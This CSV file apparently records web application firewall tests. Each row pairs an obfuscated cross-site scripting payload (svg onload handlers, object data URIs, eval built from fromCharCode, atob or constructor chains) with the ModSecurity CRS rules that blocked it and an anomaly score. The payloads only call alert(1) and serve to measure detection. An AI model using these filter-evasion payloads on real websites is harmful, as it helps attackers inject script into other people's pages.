index,payload,model,syntax,crs,rule_count,rule_ids,rule_refs,total_score,unique_id
1889,"<object type=""text/html"" data=""data:text/html,<svg xmlns='http://www.w3.org/2000/svg' onload='[].constructor.constructor(&quot;al&quot;+&quot;ert(1)&quot;)()'></svg>""></object>",0,1,block,8,"941100,941120,941130,941140,941160,941170,941300,949110","v217,176t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o85,8v217,176t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o30,15v217,176t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,139v217,176t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,93v217,176t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o30,16v217,176t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,176t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",35,177603499353.416641
1890,"<object type=""text/html"" data=""data:text/html,<svg xmlns='http://www.w3.org/2000/svg' onload='eval(String.fromCharCode(97,108,101,114,116,40,49,41))'></svg>""></object>",0,1,block,10,"933160,934100,941100,941120,941130,941140,941160,941170,941300,949110","o94,54v217,167 || o94,5v217,167 || v217,167t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o85,8v217,167t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o30,15v217,167t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,150v217,167t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,93v217,167t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o30,16v217,167t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,167t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",45,177603499520.311192
1891,"<object type=""text/html"" data=""data:text/html,<svg xmlns='http://www.w3.org/2000/svg' onload='setTimeout(&quot;al&quot;+&quot;ert(1)&quot;)'></svg>""></object>",0,1,block,8,"941100,941120,941130,941140,941160,941170,941300,949110","v217,158t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o85,8v217,158t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o30,15v217,158t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,121v217,158t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,93v217,158t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o30,16v217,158t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,158t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",35,177603499666.782729
1892,"<object type=""text/html"" data=""data:text/html,<svg xmlns='http://www.w3.org/2000/svg' onload='setInterval(&quot;al&quot;+&quot;ert(1)&quot;,1)'></svg>""></object>",0,1,block,8,"941100,941120,941130,941140,941160,941170,941300,949110","v217,161t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o85,8v217,161t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o30,15v217,161t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,124v217,161t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,93v217,161t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o30,16v217,161t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,161t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",35,177603499784.169109
1895,"<object type=""text/html"" data=""data:text/html,<svg xmlns='http://www.w3.org/2000/svg' onload='self[String.fromCharCode(101,118,97,108)](&quot;al&quot;+&quot;ert(1)&quot;)'></svg>""></object>",0,1,block,11,"934100,934100,941100,941120,941130,941140,941160,941170,941300,941370,949110","o99,19v217,189 || o99,19v217,189t:urlDecodeUni || v217,189t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o85,8v217,189t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o30,15v217,189t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,152v217,189t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,93v217,189t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o30,16v217,189t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,189t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o94,41v217,189t:urlDecodeUni,t:compressWhitespace || ",50,177603500033.825280
1897,"<object type=""text/html"" data=""data:text/html,<svg xmlns='http://www.w3.org/2000/svg' onload='eval.call(null,&quot;al&quot;+&quot;ert(1)&quot;)'></svg>""></object>",0,1,block,8,"941100,941120,941130,941140,941160,941170,941300,949110","v217,162t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o85,8v217,162t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o30,15v217,162t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,125v217,162t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,93v217,162t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o30,16v217,162t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,162t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",35,177603500225.815989
1898,"<object type=""text/html"" data=""data:text/html,<svg xmlns='http://www.w3.org/2000/svg' onload='eval.apply(null,[&quot;al&quot;+&quot;ert(1)&quot;])'></svg>""></object>",0,1,block,8,"941100,941120,941130,941140,941160,941170,941300,949110","v217,165t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o85,8v217,165t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o30,15v217,165t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,128v217,165t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,93v217,165t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o30,16v217,165t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,165t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",35,177603500432.249379
1900,"<object type=""text/html"" data=""data:text/html,<svg xmlns='http://www.w3.org/2000/svg' onload='(function(){eval(&quot;al&quot;+&quot;ert(1)&quot;)})();'></svg>""></object>",0,1,block,12,"932100,933160,934100,934100,941100,941120,941130,941140,941160,941170,941300,949110","o103,7v217,169 || o106,43v217,169 || o95,11v217,169 || o95,11v217,169t:urlDecodeUni || v217,169t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o85,8v217,169t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o30,15v217,169t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,132v217,169t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,93v217,169t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o30,16v217,169t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,169t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",55,177603500672.135621
1901,"<object type=""text/html"" data=""data:text/html,<svg xmlns='http://www.w3.org/2000/svg' onload='eval(/**/&quot;al&quot;+/**/&quot;ert(1)&quot;)'></svg>""></object>",0,1,block,11,"933160,934100,934100,941100,941120,941130,941140,941160,941170,941300,949110","o94,47v217,160 || o94,5v217,160 || o94,5v217,160t:urlDecodeUni || v217,160t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o85,8v217,160t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o30,15v217,160t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,123v217,160t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,93v217,160t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o30,16v217,160t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,160t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",50,177603500762.814168
1902,"<object type=""text/html"" data=""data:text/html,<svg xmlns='http://www.w3.org/2000/svg' onload='eval(&quot;al&quot;.concat(&quot;ert(1)&quot;))'></svg>""></object>",0,1,block,10,"933160,934100,941100,941120,941130,941140,941160,941170,941300,949110","o94,47v217,160 || o94,5v217,160 || v217,160t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o85,8v217,160t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o30,15v217,160t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,123v217,160t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,93v217,160t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o30,16v217,160t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,160t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",45,177603500827.976022
1903,"<object type=""text/html"" data=""data:text/html,<svg xmlns='http://www.w3.org/2000/svg' onload='globalThis[&quot;ev&quot;+&quot;al&quot;](&quot;al&quot;+&quot;ert(1)&quot;)'></svg>""></object>",0,1,block,8,"941100,941120,941130,941140,941160,941170,941300,949110","v217,189t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o85,8v217,189t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o30,15v217,189t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,132v217,189t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,93v217,189t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o30,16v217,189t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,189t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",35,177603501072.990600
1904,"<object type=""text/html"" data=""data:text/html,<svg xmlns='http://www.w3.org/2000/svg' onload='Array.prototype.constructor.constructor(&quot;al&quot;+&quot;ert(1)&quot;)()'></svg>""></object>",0,1,block,8,"941100,941120,941130,941140,941160,941170,941300,949110","v217,189t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o85,8v217,189t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o30,15v217,189t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,152v217,189t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,93v217,189t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o30,16v217,189t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,189t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",35,177603501155.147610
1905,"<object type=""text/html"" data=""data:text/html,<svg xmlns='http://www.w3.org/2000/svg' onload='eval(&quot;al&quot;+String.fromCharCode(101,114,116,40,49,41))'></svg>""></object>",0,1,block,11,"933160,934100,934100,941100,941120,941130,941140,941160,941170,941300,949110","o94,62v217,175 || o94,5v217,175 || o94,5v217,175t:urlDecodeUni || v217,175t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o85,8v217,175t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o30,15v217,175t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,148v217,175t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,93v217,175t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o30,16v217,175t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,175t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",50,177603501212.529918
1906,"<object type=""text/html"" data=""data:text/html,<svg xmlns='http://www.w3.org/2000/svg' onload='(1,eval)(&quot;al&quot;+&quot;ert(1)&quot;)'></svg>""></object>",0,1,block,8,"941100,941120,941130,941140,941160,941170,941300,949110","v217,156t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o85,8v217,156t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o30,15v217,156t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,119v217,156t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,93v217,156t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o30,16v217,156t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,156t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",35,177603501316.795589
1910,"<svg onload=""(function(){var c=[]['constructor']['constructor'];c('al'+'ert(1)')()})()""></svg>",0,1,block,7,"933210,934100,934100,941100,941120,941160,949110","o65,21v217,94t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,94 || o14,11v217,94t:urlDecodeUni || v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603501844.126557
1911,"<svg onload=""(function(){var d=top['Stri\u006eg']['fromCha\u0072Code'];Function(d(97,108,101,114,116,40,49,41))()})()""></svg>",0,1,block,6,"934100,941100,941120,941160,941370,949110","o14,11v217,125 || v217,125t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,125t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,125t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o31,18v217,125t:urlDecodeUni,t:compressWhitespace || ",25,177603501932.639010
1913,"<svg onload=""(function(){var f=this['Str'+'ing']['from'+'Char'+'Code'];(1,window['ev'+'al'])(f(97,108,101,114,116,40,49,41))})()""></svg>",0,1,block,8,"933210,934100,934100,941100,941120,941160,941370,949110","o80,48v217,136t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,136 || o14,11v217,136t:urlDecodeUni || v217,136t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,136t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,136t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o31,17v217,136t:urlDecodeUni,t:compressWhitespace || ",35,177603502180.150480
1914,"<svg onload=""(function(){[]['fill']['constructor']('al\u0065rt(1)')()})()""></svg>",0,1,block,6,"933210,934100,941100,941120,941160,949110","o13,60v217,81t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,81 || v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603502392.690227
1916,"<svg onload=""(function(){var h=String['fromChar'+'Code'];top['ev'+'al'](h(97,108,101,114,116,40,49,41))})()""></svg>",0,1,block,9,"932105,933210,934100,934100,941100,941120,941160,941370,949110","o56,4v217,115 || o60,47v217,115t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,115 || o14,11v217,115t:urlDecodeUni || v217,115t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,115t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,115t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o57,14v217,115t:urlDecodeUni,t:compressWhitespace || ",40,177603502597.549316
1918,"<svg onload=""(function(){var j=self['Str\x69ng']['from\x43harCode'];(1,eval)(j(97,108,101,114,116,40,49,41))})()""></svg>",0,1,block,6,"934100,941100,941120,941160,941370,949110","o14,11v217,120 || v217,120t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,120t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,120t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o31,17v217,120t:urlDecodeUni,t:compressWhitespace || ",25,177603502766.241215
1919,"<svg onload=""(()=>{Function(window['String']['fromCharCode'](97,108,101,114,116,40,49,41))()})()""></svg>",0,1,block,6,"933210,941100,941120,941160,941370,949110","o27,69v217,104t:urlDecode,t:replaceComments,t:compressWhitespace || v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o28,16v217,104t:urlDecodeUni,t:compressWhitespace || ",25,177603502976.981156
1920,"<svg onload=""(function(){var k=top['\u0053tring']['\u0066romCharCode'];setTimeout(k(97,108,101,114,116,40,49,41),0)})()""></svg>",0,1,block,6,"934100,941100,941120,941160,941370,949110","o14,11v217,127 || v217,127t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,127t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,127t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o31,18v217,127t:urlDecodeUni,t:compressWhitespace || ",25,177603503044.380916
1922,"<svg onload=""(function(){var m=globalThis['Stri'+'ng']['fromChar'+'Code'];(0,globalThis['ev'+'al'])(m(97,108,101,114,116,40,49,41))})()""></svg>",0,1,block,7,"933210,934100,934100,941100,941120,941160,949110","o87,48v217,143t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,143 || o14,11v217,143t:urlDecodeUni || v217,143t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,143t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,143t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,17760350336.409455
1924,"<svg onload=""(function(){var p=[]['constructor']['constructor']('retu'+'rn this')()['ev'+'al'];p(String['fromCharCode'](97,108,101,114,116,40,49,41))})()""></svg>",0,1,block,7,"933210,934100,934100,941100,941120,941160,949110","o31,122v217,161t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,161 || o14,11v217,161t:urlDecodeUni || v217,161t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,161t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,161t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603503543.139183
1926,"<svg onload=""(function(){const r=self['Str\x69ng']['fromCh\x61rCode'];[]['fill']['constructor'](r(97,108,101,114,116,40,49,41))()})()""></svg>",0,1,block,7,"933210,934100,941100,941120,941160,941370,949110","o70,63v217,141t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,141 || v217,141t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,141t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,141t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o33,17v217,141t:urlDecodeUni,t:compressWhitespace || ",30,177603503785.993374
1927,"<svg onload=""(function(){var b=atob;b('YWxlcnQoMSk=')['constructor']['constructor']('return this')()['eval'](b('YWxlcnQoMSk='))})()""></svg>",0,1,block,6,"933210,934100,941100,941120,941160,949110","o53,78v217,139t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,139 || v217,139t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,139t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,139t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603503872.938103
1940,"<svg onload=""Function(`var${'\x20'}n=atob;eval(n('YWxlcnQoMSk='))`)()""></svg>",0,1,block,9,"932100,932130,933160,934100,941100,941120,941160,942100,949110","o41,5v217,77 || o25,6v217,77t:urlDecodeUni,t:cmdLine || o42,27v217,77 || o42,5v217,77 || v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || v217,77 || ",40,177603505316.620303
1942,"<svg onload=""throw/**/new/**/Function('var q=atob;eval(q(\u0060YWxlcnQoMSk=\u0060))')()//""></svg>",0,1,block,7,"932100,933160,934100,941100,941120,941160,949110","o49,5v217,97 || o50,37v217,97 || o50,5v217,97 || v217,97t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,97t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,97t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,17760350564.598704
